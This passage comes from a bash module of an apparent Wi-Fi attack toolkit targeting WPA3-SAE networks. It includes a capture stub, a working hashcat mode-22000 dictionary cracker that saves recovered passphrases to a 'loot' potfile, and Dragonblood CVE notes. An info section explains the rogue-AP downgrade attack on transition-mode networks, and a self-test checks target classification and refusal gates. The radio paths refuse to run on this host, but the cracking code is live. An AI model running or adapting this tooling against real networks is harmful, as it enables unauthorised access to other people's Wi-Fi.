    dur=$(awk -F'\t' '$1=="DUR"{print $2}' <<< "$parsed")
    iface=$(awk -F'\t' '$1=="IFACE"{print $2}' <<< "$parsed")

    if ! w3_is_mac "$bssid"; then
        printf 'ERROR\tno BSSID given (got %s); usage: --capture BSSID ESSID CHANNEL [DUR]\n' \
            "${bssid:-<empty>}" >&2
        return 2
    fi
    w3_chan_ok "${chan:-x}" || { printf 'ERROR\tbad channel: %s\n' "${chan:-<empty>}" >&2; return 2; }
    [[ "$dur" =~ ^[0-9]+$ ]] || dur=120

    printf 'VERB\tcapture\nBSSID\t%s\nESSID\t%s\nCHANNEL\t%s\nDURATION\t%s\n' \
        "$bssid" "$essid" "$chan" "$dur"

    # A capture is passive: it needs the receive path but no transmission, so
    # a capture tool is the additional named prerequisite here.
    local rc=0
    if ! w3_have hcxdumptool && ! w3_have airodump-ng; then
        printf 'MISSING\thcxdumptool or airodump-ng (nothing here can write a capture)\n' >&2
        rc=1
    else
        printf 'PREREQ\tcapture_tool\t%s\n' \
            "$(w3_have hcxdumptool && w3_tool_path hcxdumptool || w3_tool_path airodump-ng)"
    fi
    if ! w3_radio_gate capture "$iface"; then rc=1; fi
    if (( rc != 0 )); then
        printf 'REFUSED\tcapture\n'
        printf 'REASON\tno SAE exchange was captured; the prerequisites named MISSING above\n'
        printf 'REASON\tare absent, so no interface was put into monitor mode and no pcap\n'
        printf 'REASON\twas written.\n'
        printf 'EXECUTED\t0\n'
        return 1
    fi
    # Reached only if every prerequisite is satisfied. No capture backend is
    # wired up here, so say that rather than reporting success.
    printf 'ERROR\tall gate prerequisites passed but this module has no capture backend;\n' >&2
    printf 'ERROR\tnothing was captured.\n' >&2
    printf 'EXECUTED\t0\n'
    return 1
}

# ── offline SAE (mode 22000) dictionary work ─────────────────────────────

w3_pick_capture() {
    local explicit="$1" d f newest="" newest_t=0 t
    if [[ -n "$explicit" ]]; then
        [[ -f "$explicit" ]] || return 1
        printf '%s\n' "$explicit"; return 0
    fi
    for d in "$MOD_LOOT" "$MOD_CAPS" "$CAPTURES_DIR"; do
        [[ -d "$d" ]] || continue
        for f in "$d"/*.hc22000 "$d"/*.22000; do
            [[ -f "$f" ]] || continue
            t=$(stat -c %Y "$f" 2>/dev/null || echo 0)
            if (( t > newest_t )); then newest_t="$t"; newest="$f"; fi
        done
    done
    [[ -n "$newest" ]] || return 1
    printf '%s\n' "$newest"
}

w3_build_hashcat_cmd() {
    local hash="$1" wordlist="$2" mode=22000 extra=()
    extra=(-m "$mode" "$hash" "$wordlist" --potfile-path "$MOD_LOOT/hashcat.potfile")
    printf 'hashcat'
    local a
    for a in "${extra[@]}"; do printf ' %q' "$a"; done
    printf '\n'
}

w3_sae_brute() {
    local a1="$1" a2="$2" a3="$3"
    [[ -n "$a1" ]] || {
        printf 'ERROR\tusage: --sae-brute BSSID ESSID WORDLIST (or --sae-brute IFACE BSSID WORDLIST)\n' >&2
        return 2
    }
    local bssid="" essid="" wordlist="" iface=""
    if w3_is_mac "$a1"; then
        bssid="$a1"; essid="$a2"; wordlist="$a3"
    elif w3_is_iface "$a1"; then
        iface="$a1"; bssid="$a2"; wordlist="$a3"
    else
        # Two-argument form: BSSID plus the wordlist, ESSID unknown.
        bssid="$a1"; essid=""; wordlist="$a2"
    fi
    printf 'VERB\tsae-brute\nBSSID\t%s\nESSID\t%s\nIFACE\t%s\nMODULE\tHASHCAT_MODE_22000\n' \
        "${bssid:-}" "${essid:-}" "${iface:-}"

    if [[ -z "$wordlist" ]]; then
        printf 'ERROR\tno wordlist argument: usage: --sae-brute BSSID ESSID WORDLIST\n' >&2
        return 2
    fi
    if [[ ! -e "$wordlist" ]]; then
        printf 'ERROR\twordlist not found: %s\n' "$wordlist" >&2
        return 2
    fi
    if [[ ! -f "$wordlist" ]]; then
        printf 'ERROR\twordlist is not a regular file: %s\n' "$wordlist" >&2
        return 2
    fi
    if [[ ! -r "$wordlist" ]]; then
        printf 'ERROR\twordlist not readable: %s\n' "$wordlist" >&2
        return 2
    fi
    local wl_lines
    wl_lines=$(wc -l < "$wordlist" 2>/dev/null || echo 0)
    printf 'WORDLIST\t%s\nWORDLIST_LINES\t%s\n' "$wordlist" "$wl_lines"

    if ! w3_have hashcat; then
        printf 'MISSING\thashcat (apt install hashcat)\n' >&2
        printf 'EXECUTED\t0\n'
        return 1
    fi
    local hc_ver
    hc_ver=$(hashcat --version 2>/dev/null | head -1 || echo unknown)
    printf 'HASHCAT\t%s\n' "$(w3_tool_path hashcat)"
    printf 'HASHCAT_VERSION\t%s\n' "$hc_ver"

    local hash
    if ! hash=$(w3_pick_capture "" 2>/dev/null); then
        printf 'MISSING\tSAE material: no .hc22000 in %s or %s\n' "$MOD_LOOT" "$MOD_CAPS" >&2
        printf 'ERROR\tnothing to crack: SAE is a PAKE, so a mode-22000 hash must come\n' >&2
        printf 'ERROR\tfrom a captured SAE exchange (hcxpcapngtool -o out.hc22000 cap.pcapng).\n' >&2
        printf 'ERROR\tA bare beacon or a PMKID from a WPA3-only AP does not produce one.\n' >&2
        printf 'EXECUTED\t0\n'
        return 1
    fi
    printf 'HASHFILE\t%s\n' "$hash"
    local pot="$MOD_LOOT/hashcat.potfile"
    if [[ -s "$pot" ]]; then
        local shown
        shown=$(awk -F: 'NF>1{print $NF; exit}' "$pot" 2>/dev/null)
        if [[ -n "$shown" ]]; then
            printf 'POTFILE_HIT\t%s\n' "$shown"
            printf 'NOTE\ta previous run already recorded a candidate; re-running is a no-op\n'
        fi
    fi

    printf 'HASHCAT_CMD\t%s\n' "$(w3_build_hashcat_cmd "$hash" "$wordlist")"
    printf 'NOTE\tmode 22000 covers WPA3/SAE because the SAE exchange and the WPA2\n'
    printf 'NOTE\t4-way handshake share the same hash format; it is not a plain PSK.\n'

    local out="$MOD_LOGS/hashcat_22000_$(date +%Y%m%d-%H%M%S).log"
    mkdir -p "$MOD_LOGS" 2>/dev/null
    local rc=0
    hashcat -m 22000 "$hash" "$wordlist" --potfile-path "$pot" \
        --quiet --status --status-timer 10 > "$out" 2>&1 || rc=$?
    printf 'HASHCAT_RC\t%s\nLOG\t%s\n' "$rc" "$out"
    # The potfile is the only thing that proves a crack; hashcat status text
    # is not trusted for the verdict.
    local found
    found=$(awk -F: -v h="$hash" 'NF>1 && $1 ~ /^[0-9a-fA-F]+$/ {print $NF; exit}' "$pot" 2>/dev/null)
    if [[ -n "$found" ]]; then
        printf 'CRACKED\t1\nPASSPHRASE\t%s\n' "$found"
        return 0
    fi
    printf 'CRACKED\t0\n'
    printf 'RESULT\tNO_MATCH\n'
    printf 'NOTE\tno candidate in %s matched; that is a result about this wordlist,\n' "$wordlist"
    printf 'NOTE\tnot a statement that the passphrase is uncrackable.\n'
    return 1
}

# ── Dragonblood ──────────────────────────────────────────────────────────

w3_dragonblood_assess() {
    local pcap="${1:-}"
    printf 'CLASS\tDRAGONBLOOD\n'
    printf 'CVE\tCVE-2019-9494\tSAE group downgrade / invalid-curve and group negotiation\n'
    printf 'CVE\tCVE-2019-9496\tSAE timing and cache side channel against the password\n'
    printf 'CVE\tCVE-2019-9495\tEAP-pwd (WPA3-Enterprise) — out of scope, 13_802.1x_relay.sh\n'
    printf 'CVE\tCVE-2019-9497\tEAP-pwd reflection — out of scope, 13_802.1x_relay.sh\n'
    printf 'NEEDS_9494\ta captured SAE commit exchange plus a client that accepts a\n'
    printf 'NEEDS_9494\tdowngraded group; the attack is iterative and offline once the\n'
    printf 'NEEDS_9494\texchange is captured. It recovers the password only for groups\n'
    printf 'NEEDS_9494\twith a small subgroup, and group 19 negotiation can be pushed\n'
    printf 'NEEDS_9494\ttoward group 22 where the search space is far smaller.\n'
    printf 'NEEDS_9496\tprecise timing of the client SAE implementation and local code\n'
    printf 'NEEDS_9496\texecution on the same cache; it is a per-password oracle, not a\n'
    printf 'NEEDS_9496\tsingle-shot crack, and it is not a network-only attack.\n'
    printf 'MITIGATION\thostapd/wpa_supplicant 2.9 or newer restrict groups to 19 and\n'
    printf 'MITIGATION\tuse the constant-time SAE implementation (CONFIG_SAE).\n'
    printf 'ASSESS\t%s\n' "$([[ -z "$pcap" ]] && echo NO_INPUT || echo ANALYSING)"

    if [[ -z "$pcap" ]]; then
        printf 'NOTE\tno capture given: the class description above is static. Pass a\n'
        printf 'NOTE\tpcap (--dragonblood FILE) to assess what is determinable from it.\n'
        return 0
    fi
    [[ -f "$pcap" ]] || { printf 'ERROR\tno such file: %s\n' "$pcap" >&2; return 2; }
    w3_have tshark || { printf 'ERROR\ttshark not installed\n' >&2; return 1; }

    local frames
    frames=$(tshark -r "$pcap" -Y 'wlan.fc.type_subtype == 0x0b' -T fields \
              -e wlan.fixed.auth.alg 2>/dev/null | grep -c '^3' || true)
    printf 'SAE_AUTH_FRAMES\t%s\n' "${frames:-0}"
    if [[ "${frames:-0}" == "0" ]]; then
        printf 'ASSESS\tNO_SAE_EXCHANGE\n'
        printf 'NOTE\tno SAE authentication frames in this capture, so no group can be\n'
        printf 'NOTE\tdetermined. A beacon-only capture never contains a commit exchange.\n'
        return 0
    fi
    printf 'ASSESS\tSAE_CAPTURED\n'
    printf 'NOTE\tSAE frames present. The group actually negotiated lives in the SAE\n'
    printf 'NOTE\tcommit frame; tshark support for that field varies by version, so the\n'
    printf 'NOTE\tgroup is reported only when it can be read, never guessed.\n'
    return 0
}

# ── info ─────────────────────────────────────────────────────────────────

w3_info() {
    cat <<'EOF'
WPA3-Personal (SAE) — attack surface on this host

WHAT SAE IS
  SAE (Simultaneous Authentication of Equals) replaced the WPA2 PSK
  handshake with a PAKE, a password-authenticated key exchange. Both sides
  prove knowledge of the password without ever sending a value from which
  the password can be derived, and the resulting key has forward secrecy.
  Consequence: an SAE exchange cannot be cracked the way a WPA2 4-way
  handshake can, because there is no offline-verifiable PSK hash in it.
  WPA3-SAE is AKM suite 0x000fac08.

H2E VS HUNTING-AND-PECKING
  The password is converted to a group element. The original method,
  hunting-and-pecking, repeatedly hashes the password and tests candidate
  elements, which leaks timing and makes side-channel attacks possible.
  Hash-to-Element (H2E) derives the element in constant time and is
  mandatory in WPA3 R3. A client using hunting-and-pecking is the weaker
  target; WPA3-only APs that advertise H2E do not necessarily mean the
  client uses it.

TRANSITION MODE — the actual downgrade surface
  A WPA3 transition AP advertises BOTH AKM 2/4 (WPA2-PSK) and AKM 8
  (WPA3-SAE) in one RSN element. A client that supports SAE will use SAE,
  but the WPA2 path is still there, so an attacker who stands up a
  WPA2-only AP with the same ESSID can get a client to run the WPA2
  4-way handshake instead — and that handshake IS crackable offline.
  The same passphrase is used for both, which is the whole point of the
  attack. Detecting these APs is --transition-tsv; it needs no radio.

DRAGONBLOOD (2019)
  CVE-2019-9494  SAE group downgrade weakening the PAKE, and invalid-curve
                 attacks against implementations that fail to validate
                 the peer element.
  CVE-2019-9496  timing and cache side channel against the SAE password.
  CVE-2019-9495  EAP-pwd side channel (WPA3-Enterprise).
  CVE-2019-9497  EAP-pwd reflection (WPA3-Enterprise).
  The two EAP-pwd issues belong to 13_802.1x_relay.sh, not to this module.
  Both SAE issues assume the client is vulnerable and the exchange can be
  observed; a radio is required to obtain one. --dragonblood reports what
  is determinable from a capture and refuses to guess a group.

WHAT NEEDS A RADIO (and therefore cannot run on this host)
  --downgrade    rogue AP transmitting WPA2-only; needs AP mode plus a
                 second adapter receiving, and hostapd.
  --capture      monitor mode on the target channel for the duration.
  --sae-brute    does NOT need a radio. It is offline hashcat work on a
                 captured exchange: mode 22000, run against a wordlist.

OFFLINE, WORKS HERE
  --status-tsv, --check-deps, --transition-tsv, --sae-brute (given a
  capture), --dragonblood, --selftest.

HONEST LIMIT
  This host has one monitor-capable radio (wlp5s0), no second adapter, no
  injection-verified adapter and no WPA3 target. Every transmitting path
  refuses and names the missing prerequisite; the downgrade path also
  writes a runnable plan to loot/wpa3_attack/.
EOF
}

# ── self-test (fully offline) ────────────────────────────────────────────

w3_selftest() {
    # Every path below must be contained: a selftest that writes into the
    # real loot would corrupt user data just by being run.
    local _st _save_loot
    _st=$(mktemp -d "${MOD_TMP:-/tmp}/selftest.XXXXXX")
    _save_loot="$MOD_LOOT"
    MOD_LOOT="$_st/loot"; mkdir -p "$MOD_LOOT"
    # Paths built from MOD_LOOT at load time are separate variables; moving
    # MOD_LOOT alone would leave them pointing into the real loot tree.
    _save_results="${W3_RESULTS:-}"
    W3_RESULTS="$MOD_LOOT/transition.tsv"
    trap 'MOD_LOOT="$_save_loot"; W3_RESULTS="$_save_results"; rm -rf "$_st"' RETURN

    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad+1)); fi
    }
    local st="$MOD_TMP/selftest"
    rm -rf "$st"; mkdir -p "$st"

    # 1. AKM classifier: the three classes that matter plus the edge cases.
    chk akm-sae-only      "$(w3_classify_aki 0x000fac08 | cut -f1)" WPA3-only
    chk akm-psk-only      "$(w3_classify_aki 0x000fac02 | cut -f1)" WPA2-only
    chk akm-transition    "$(w3_classify_aki '0x000fac02 0x000fac08' | cut -f1)" TRANSITION
    chk akm-transition-r  "$(w3_classify_aki '0x000fac08 0x000fac04' | cut -f1)" TRANSITION
    chk akm-psk-sha256    "$(w3_classify_aki 0x000fac06 | cut -f1)" WPA2-only
    # Selector values from hostapd src/common/defs.h:
    #   0x09 = 9 FT-SAE, 0x12 = 18 OWE,
    #   0x0c = 12 802.1X-SUITE-B-192, 0x17 = 23 802.1X-SHA384,
    #   0x13 = 19 and 0x14 = 20 PSK-SHA384,
    #   0x18 = 24 SAE-EXT-KEY and 0x19 = 25 FT-SAE-EXT-KEY (WPA3-Enterprise).
    chk akm-ft-sae        "$(w3_classify_aki 0x000fac09 | cut -f1)" WPA3-only
    chk akm-owe           "$(w3_classify_aki 0x000fac12 | cut -f1)" OWE-only
    chk akm-owe-reason    "$(w3_classify_aki 0x000fac12 | cut -f2)" owe
    # WPA3-Enterprise (24/25) must be labelled, never attacked: that is
    # 13_802.1x_relay.sh territory, not this module. These two are the ones
    # most easily mistaken for SAE.
    chk akm-wpa3ent-24    "$(w3_classify_aki 0x000fac18 | cut -f1)" WPA3-ENTERPRISE-only
    chk akm-wpa3ent-25    "$(w3_classify_aki 0x000fac19 | cut -f1)" WPA3-ENTERPRISE-only
    chk akm-wpa3ent-24-not-sae "$(w3_classify_aki 0x000fac18 | cut -f2)" wpa3ent
    chk akm-ent192        "$(w3_classify_aki 0x000fac0c | cut -f1)" WPA2-ENTERPRISE-SHA384-only
    chk akm-entsha384     "$(w3_classify_aki 0x000fac13 | cut -f1)" WPA2-ENTERPRISE-SHA384-only
    chk akm-ent-mixed     "$(w3_classify_aki '0x000fac02 0x000fac18' | cut -f1)" WPA3-ENTERPRISE-MIXED
    chk akm-fils          "$(w3_classify_aki 0x000fac0e | cut -f1)" FILS-PASN-out-of-scope
    chk akm-unknown       "$(w3_classify_aki 0x000fac99 | cut -f1)" UNKNOWN
    chk akm-empty-rc      "$(w3_classify_aki "" >/dev/null 2>&1; echo $?)" 2
    chk akm-reason-keeps-both "$(w3_classify_aki '0x000fac02 0x000fac08' | cut -f2)" "psk|sae"

    # 2. AKM suite split: OUI and selector from one 32-bit value.
    local parts
    parts=$(w3_aki_parts 0x000fac08)
    chk aki-sel       "$(printf '%s\n' "$parts" | awk -F'\t' '$1=="SEL"{print $2}')" 0x08
    chk aki-oui       "$(printf '%s\n' "$parts" | awk -F'\t' '$1=="OUI"{print $2}')" 000fac
    chk aki-hex       "$(printf '%s\n' "$parts" | awk -F'\t' '$1=="HEX"{print $2}')" 0x000fac08
    chk aki-bad-rc    "$(w3_aki_parts zzz >/dev/null 2>&1; echo $?)" 2

    # 3. Transition classification from synthetic shorthand rows. Row 2 is
    #    the downgrade surface (WPA2+WPA3 in one RSN), row 1 is SAE only and
    #    row 3 is the legacy network that must NOT be reported as transition.
    cat > "$st/rows.csv" <<'CSV'
aa:bb:cc:00:00:01,SAEOnly,WPA3,SAE,CCMP
aa:bb:cc:00:00:02,MixedNet,WPA2/WPA3,WPA2/WPA3,CCMP
aa:bb:cc:00:00:03,Legacy,WPA2,PSK,CCMP
CSV
    local tout
    tout=$(w3_transition_tsv "$st/rows.csv" 2>&1)
    chk tsv-rc          "$?" 0
    chk tsv-aps         "$(printf '%s\n' "$tout" | awk -F'\t' '$1=="APS"{print $2}')" 3
    chk tsv-mode        "$(printf '%s\n' "$tout" | awk -F'\t' '$1=="MODE"{print $2}')" shorthand
    chk tsv-class-sae   "$(printf '%s\n' "$tout" | awk -F'\t' '$1=="aa:bb:cc:00:00:01"{print $3}')" WPA3-only
    chk tsv-class-mixed "$(printf '%s\n' "$tout" | awk -F'\t' '$1=="aa:bb:cc:00:00:02"{print $3}')" TRANSITION
    chk tsv-class-wpa2  "$(printf '%s\n' "$tout" | awk -F'\t' '$1=="aa:bb:cc:00:00:03"{print $3}')" WPA2-only
    chk tsv-surface     "$(printf '%s\n' "$tout" | awk -F'\t' '$1=="DOWNGRADE_SURFACE"{print $2}')" 1
    # The TRANSITION row must be emitted first: it is the exploitable set.
    chk tsv-trans-first "$(printf '%s\n' "$tout" | awk -F'\t' '$1 ~ /^aa:bb:cc/{print $1; exit}')" "aa:bb:cc:00:00:02"
    # The header row and the summary section must both be present.
    chk tsv-header      "$(printf '%s\n' "$tout" | grep -c $'^BSSID\tESSID\tCLASS\tREASON')" 1
    chk tsv-summary     "$(printf '%s\n' "$tout" | grep -c $'^SECTION\tSUMMARY')" 1

    # ... the same classifier over an airodump-ng 15-column CSV, because the
    # real source for this verb is a live scan, not the shorthand above.
    cat > "$st/airodump.csv" <<'CSV'
BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key

AA:BB:CC:00:00:11, 2024-01-01 10:00:00, 2024-01-01 10:01:00, 6, 54, WPA2, CCMP, PSK, -70, 3, 0, 0.0.0.0, 5, "Legacy2",
AA:BB:CC:00:00:12, 2024-01-01 10:00:00, 2024-01-01 10:01:00, 6, 54, WPA2, CCMP, SAE, -60, 3, 0, 0.0.0.0, 8, "SaeOnly2",
AA:BB:CC:00:00:13, 2024-01-01 10:00:00, 2024-01-01 10:01:00, 6, 54, WPA2/WPA3, CCMP, WPA2/WPA3, -50, 3, 0, 0.0.0.0, 9, "Mixed2",

Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs
11:22:33:44:55:66, 2024-01-01 10:00:00, 2024-01-01 10:01:00, -30, 4, AA:BB:CC:00:00:99, "NotAnAP"
CSV
    tout=$(w3_transition_tsv "$st/airodump.csv" 2>&1)
    chk airodump-rc        "$?" 0
    chk airodump-mode      "$(printf '%s\n' "$tout" | awk -F'\t' '$1=="MODE"{print $2}')" airodump
    chk airodump-aps       "$(printf '%s\n' "$tout" | awk -F'\t' '$1=="APS"{print $2}')" 3
    chk airodump-mixed     "$(printf '%s\n' "$tout" | awk -F'\t' '$1=="AA:BB:CC:00:00:13"{print $3}')" TRANSITION
    chk airodump-station-out "$(printf '%s\n' "$tout" | grep -c 'NotAnAP')" 0
    chk airodump-essid     "$(printf '%s\n' "$tout" | awk -F'\t' '$1=="AA:BB:CC:00:00:12"{print $2}')" SaeOnly2

    # 3b. A hidden-SSID row must keep its column positions. The ESSID is the
    #     second field, so the collapsing `IFS=$'\t' read` moved the BSSID into
    #     the ESSID column and shifted the privacy/AKM columns out from under
    #     the classifier: the AP read as UNKNOWN and the downgrade surface was
    #     reported as zero.
    w3_split_tab $'aa:bb:cc:00:00:21\t\tWPA2/WPA3\tWPA2/WPA3\tCCMP'
    chk split-hidden-count "${#W3_F[@]}" 5
    chk split-hidden-essid "${W3_F[1]:-}" ""
    chk split-hidden-priv  "${W3_F[2]:-}" WPA2/WPA3
    printf 'ROW\t\taa:bb:cc:00:00:21\tWPA2/WPA3\tWPA2/WPA3\tCCMP\n' \
        | w3_transition_render > "$st/render.tsv"
    chk render-hidden-bssid "$(awk -F'\t' 'NR==2{print $1}' "$st/render.tsv")" aa:bb:cc:00:00:21
    chk render-hidden-essid "$(awk -F'\t' 'NR==2{print $2}' "$st/render.tsv")" ""
    chk render-hidden-class "$(awk -F'\t' 'NR==2{print $3}' "$st/render.tsv")" TRANSITION

    # ... and the same AP through the whole verb, from a shorthand CSV whose
    #     ESSID column is empty, must still land in the exploitable set.
    printf 'aa:bb:cc:00:00:22,,WPA2/WPA3,WPA2/WPA3,CCMP\n' > "$st/hidden.csv"
    tout=$(w3_transition_tsv "$st/hidden.csv" 2>&1)
    chk hidden-essid-rc      "$?" 0
    chk hidden-essid-bssid   "$(printf '%s\n' "$tout" | awk -F'\t' '$1=="aa:bb:cc:00:00:22"{print $1}')" aa:bb:cc:00:00:22
    chk hidden-essid-empty   "$(printf '%s\n' "$tout" | awk -F'\t' '$1=="aa:bb:cc:00:00:22"{print NF}')" 4
    chk hidden-essid-class   "$(printf '%s\n' "$tout" | awk -F'\t' '$1=="aa:bb:cc:00:00:22"{print $3}')" TRANSITION
    chk hidden-essid-surface "$(printf '%s\n' "$tout" | awk -F'\t' '$1=="DOWNGRADE_SURFACE"{print $2}')" 1

    # 4. Rows that parse to nothing must fail, not silently report zero APs.
    printf 'not,a,valid,row\n' > "$st/bad.csv"
    w3_transition_tsv "$st/bad.csv" >/dev/null 2>&1
    chk tsv-garbage-rc    "$?" 1
    w3_transition_tsv "$st/absent.csv" >/dev/null 2>&1
    chk tsv-missing-rc    "$?" 2

    # 5. Channel validation and argument-shape decoding.
    chk chan-ok-6   "$(w3_chan_ok 6; echo $?)" 0
    chk chan-ok-233 "$(w3_chan_ok 233; echo $?)" 0
    chk chan-bad-0  "$(w3_chan_ok 0; echo $?)" 1
    chk chan-bad-x  "$(w3_chan_ok x; echo $?)" 1
    chk mac-yes     "$(w3_is_mac aa:bb:cc:dd:ee:ff; echo $?)" 0
    chk mac-no      "$(w3_is_mac wlp5s0; echo $?)" 1

    local p
    p=$(w3_parse_target aa:bb:cc:dd:ee:ff MyNet 6 60)
    chk parse-kc-type  "$(printf '%s\n' "$p" | awk -F'\t' '$1=="TYPE"{print $2}')" killchain
    chk parse-kc-bssid "$(printf '%s\n' "$p" | awk -F'\t' '$1=="BSSID"{print $2}')" aa:bb:cc:dd:ee:ff
    chk parse-kc-essid "$(printf '%s\n' "$p" | awk -F'\t' '$1=="ESSID"{print $2}')" MyNet
    chk parse-kc-chan  "$(printf '%s\n' "$p" | awk -F'\t' '$1=="CHANNEL"{print $2}')" 6
    chk parse-kc-dur   "$(printf '%s\n' "$p" | awk -F'\t' '$1=="DUR"{print $2}')" 60
    # ... the GUI passes IFACE BSSID CHANNEL DUR for the same verb.
    p=$(w3_parse_target lo aa:bb:cc:dd:ee:ff 6 60)
    chk parse-gui-type  "$(printf '%s\n' "$p" | awk -F'\t' '$1=="TYPE"{print $2}')" gui
    chk parse-gui-iface "$(printf '%s\n' "$p" | awk -F'\t' '$1=="IFACE"{print $2}')" lo
    chk parse-gui-bssid "$(printf '%s\n' "$p" | awk -F'\t' '$1=="BSSID"{print $2}')" aa:bb:cc:dd:ee:ff
    p=$(w3_parse_target nonsense 1 6)
    chk parse-junk-rc   "$(w3_parse_target nonsense 1 6 >/dev/null 2>&1; echo $?)" 2

    # 6. Missing arguments on the three killchain verbs must be usage errors.
    w3_downgrade "" "" "" ""    >/dev/null 2>&1; chk downgrade-noargs-rc "$?" 2
    w3_capture   "" "" "" ""    >/dev/null 2>&1; chk capture-noargs-rc   "$?" 2
    w3_sae_brute "" "" ""       >/dev/null 2>&1; chk saebrute-noargs-rc  "$?" 2
    w3_downgrade aa:bb:cc:dd:ee:ff "" "" "" >/dev/null 2>&1
    chk downgrade-noessid-rc "$?" 2
    w3_downgrade aa:bb:cc:dd:ee:ff Net 999 >/dev/null 2>&1
    chk downgrade-badchan-rc "$?" 2
    w3_downgrade wlp5s0 "" 6 >/dev/null 2>&1
    chk downgrade-gui-nobssid-rc "$?" 2
    w3_capture aa:bb:cc:dd:ee:ff Net 0 >/dev/null 2>&1
    chk capture-badchan-rc "$?" 2

    # 7. Wordlist validation: a missing file is a named, non-zero error.
    local miss_out miss_rc
    miss_out=$(w3_sae_brute aa:bb:cc:dd:ee:ff Net "$st/no_such_wordlist.txt" 2>&1)
    miss_rc=$?
    chk wordlist-missing-rc  "$miss_rc" 2
    chk wordlist-missing-msg "$(printf '%s\n' "$miss_out" | grep -c "wordlist not found")" 1
    mkdir -p "$st/adir"
    w3_sae_brute aa:bb:cc:dd:ee:ff Net "$st/adir" >/dev/null 2>&1
    chk wordlist-dir-rc      "$?" 2
    # ... and with a valid wordlist but no capture, it must refuse rather
    #     than report a crack. HOME/LOOT are redirected so this is offline.
    printf 'password\n12345678\n' > "$st/words.txt"
    local save_loot="$MOD_LOOT"
    MOD_LOOT="$st/loot"; mkdir -p "$MOD_LOOT"
    local nocap_out nocap_rc
    nocap_out=$(w3_sae_brute aa:bb:cc:dd:ee:ff Net "$st/words.txt" 2>&1)
    nocap_rc=$?
    chk saebrute-nocapture-rc  "$nocap_rc" 1
    chk saebrute-no-fake-crack "$(printf '%s\n' "$nocap_out" | grep -c '^CRACKED')" 0
    chk saebrute-names-cause   "$(printf '%s\n' "$nocap_out" | grep -c 'no .hc22000')" 1
    MOD_LOOT="$save_loot"

    # 8. The hashcat invocation must carry the mode that covers WPA3/SAE.
    local cmd
    cmd=$(w3_build_hashcat_cmd /tmp/x.hc22000 /tmp/w.txt)
    chk hashcat-mode    "$(printf '%s\n' "$cmd" | grep -c -- '-m 22000')" 1
    chk hashcat-hash    "$(printf '%s\n' "$cmd" | grep -c -- '/tmp/x.hc22000')" 1
    chk hashcat-wordlist "$(printf '%s\n' "$cmd" | grep -c -- '/tmp/w.txt')" 1

    # 9. The radio gate must refuse AND name the missing prerequisite.
    local gate_out gate_rc
    # The downgrade refusal writes a plan into MOD_LOOT, so point MOD_LOOT at
    # scratch for this test and restore it afterwards. The live loot tree is
    # never written to by --selftest.
    MOD_LOOT="$st/loot"; mkdir -p "$MOD_LOOT"
    # W3_FORCE_PHYS pins the radio count so this branch is exercised on any
    # host, including one that really does have two adapters.
    gate_out=$(W3_FORCE_PHYS=1 w3_radio_gate downgrade "" 2>&1)
    gate_rc=$?
    chk gate-refuses-rc     "$([[ $gate_rc -ne 0 ]] && echo nonzero || echo zero)" nonzero
    chk gate-names-adapter  "$(printf '%s\n' "$gate_out" | grep -c 'second radio')" 1
    chk gate-names-injection "$(printf '%s\n' "$gate_out" | grep -c 'injection-verified adapter')" 1
    # Every prerequisite line must carry a name the caller can act on.
    chk gate-names-prereq   "$(printf '%s\n' "$gate_out" | grep -cP '^(MISSING|PREREQ)\t')" \
        "$(printf '%s\n' "$gate_out" | grep -cE '^(MISSING|PREREQ)')"
    chk gate-header         "$(printf '%s\n' "$gate_out" | grep -c $'^GATE\tdowngrade')" 1

    # ... the live verbs refuse on this host and must not print EXECUTED 1.
    local dg_out dg_rc cp_out cp_rc
    dg_out=$(W3_FORCE_PHYS=1 w3_downgrade aa:bb:cc:dd:ee:ff SelftestNet 6 1 2>&1)
    dg_rc=$?
    chk downgrade-refuses-rc  "$dg_rc" 1
    chk downgrade-not-executed "$(printf '%s\n' "$dg_out" | grep -c $'^EXECUTED\t0')" 1
    chk downgrade-refused-line "$(printf '%s\n' "$dg_out" | grep -c $'^REFUSED\tdowngrade')" 1
    chk downgrade-plan-written "$(printf '%s\n' "$dg_out" | grep -c '^PLAN_FILE')" 1
    # ... and the plan must actually exist on disk, not just be announced.
    local planfile
    planfile=$(printf '%s\n' "$dg_out" | awk -F'\t' '$1=="PLAN_FILE"{print $2}')
    chk downgrade-plan-exists "$([[ -f "$planfile" ]] && echo 1 || echo 0)" 1
    chk downgrade-plan-steps  "$(grep -c '^STEP' "$planfile" 2>/dev/null)" 7
    cp_out=$(W3_FORCE_PHYS=1 w3_capture aa:bb:cc:dd:ee:ff SelftestNet 6 1 2>&1)
    cp_rc=$?
    chk capture-refuses-rc    "$cp_rc" 1
    chk capture-not-executed  "$(printf '%s\n' "$cp_out" | grep -c $'^EXECUTED\t0')" 1
    chk capture-refused-line  "$(printf '%s\n' "$cp_out" | grep -c $'^REFUSED\tcapture')" 1
    chk capture-names-injection "$(printf '%s\n' "$cp_out" | grep -c 'injection-verified adapter')" 1
    chk capture-names-tool    "$(printf '%s\n' "$cp_out" | grep -cP '^(PREREQ\tcapture_tool|MISSING\thcxdumptool)')" 1
    MOD_LOOT="$save_loot"

    # 10. Dragonblood reports the SAE CVEs and refuses to invent a group.
    local db_out
    db_out=$(w3_dragonblood_assess 2>&1)
    chk dragonblood-9494 "$(printf '%s\n' "$db_out" | grep -c 'CVE-2019-9494')" 1
    chk dragonblood-9496 "$(printf '%s\n' "$db_out" | grep -c 'CVE-2019-9496')" 1
    chk dragonblood-no-input "$(printf '%s\n' "$db_out" | awk -F'\t' '$1=="ASSESS"{print $2}')" NO_INPUT
    chk dragonblood-missing-rc "$(w3_dragonblood_assess "$st/absent.pcap" >/dev/null 2>&1; echo $?)" 2

    # 11. Status must separate offline capability from radio capability.
    local st_out
    st_out=$(w3_status_tsv 2>&1)
    chk status-offline-section "$(printf '%s\n' "$st_out" | grep -c $'^section\tOFFLINE')" 1
    chk status-radio-section   "$(printf '%s\n' "$st_out" | grep -c $'^section\tRADIO')" 1
    chk status-offline-ok      "$(printf '%s\n' "$st_out" | awk -F'\t' '$1=="offline_analysis"{print $2}')" 1
    chk status-inj-unverified  "$(printf '%s\n' "$st_out" | awk -F'\t' '$1=="injection_verified"{print $2}')" 0
